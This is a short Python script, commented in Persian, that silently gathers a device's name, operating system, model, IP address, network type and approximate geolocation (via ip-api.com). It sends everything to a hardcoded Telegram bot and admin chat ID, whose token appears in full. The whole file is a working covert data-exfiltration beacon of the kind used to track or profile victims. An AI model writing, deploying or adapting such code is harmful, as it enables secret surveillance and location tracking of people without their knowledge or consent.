import hashlib
import socket
import platform
import requests
import os

# مشخصات ربات تلگرام
BOT_TOKEN = "8182982379:AAFbB7vFpuCTjH6MHDu7CcZR1nog5grZEWg"
ADMIN_CHAT_ID = "8152202322"

def get_device_info():
    """ دریافت نام دستگاه، مدل، و سیستم‌عامل """
    device_name = platform.node()
    system_info = platform.system() + " " + platform.release()
    model_info = platform.machine()
    return device_name, system_info, model_info

def get_user_ip():
    """ دریافت آی‌پی گوشی """
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        return f"خطا در دریافت آی‌پی: {e}"

def hash_ip(ip):
    """ هش کردن آی‌پی برای امنیت بیشتر """
    return hashlib.sha256(ip.encode()).hexdigest() if ip else None

def get_network_type():
    """ بررسی نوع اینترنت (WiFi یا داده موبایل) """
    try:
        network_type = "مجهول"
        if "WIFI" in os.popen("ip route").read():
            network_type = "WiFi"
        else:
            network_type = "داده موبایل"
        return network_type
    except Exception as e:
        return f"خطا در تشخیص شبکه: {e}"

def get_location(ip):
    """ دریافت موقعیت مکانی براساس آی‌پی """
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        location_info = f"{data['country']}, {data['regionName']}, {data['city']} ({data['lat']}, {data['lon']})"
        return location_info
    except Exception as e:
        return f"خطا در دریافت موقعیت مکانی: {e}"

def send_to_admin(message):
    """ ارسال پیام فقط به ادمین در تلگرام """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": message}
    requests.post(url, data=data)

# جمع‌آوری اطلاعات و ارسال
device_name, system_info, model_info = get_device_info()
user_ip = get_user_ip()
hashed_ip = hash_ip(user_ip)
network_type = get_network_type()
location_info = get_location(user_ip)

message = f"""🔹 اطلاعات جدید دستگاه ثبت شد:
📱 نام دستگاه: {device_name}
📟 مدل: {model_info}
🖥️ سیستم‌عامل: {system_info}
🌍 آی‌پی: {user_ip}
🔒 هش آی‌پی: {hashed_ip}
📡 نوع اینترنت: {network_type}
📍 موقعیت مکانی: {location_info}
"""

send_to_admin(message)
print("✅ اطلاعات به تلگرام ارسال شد.")
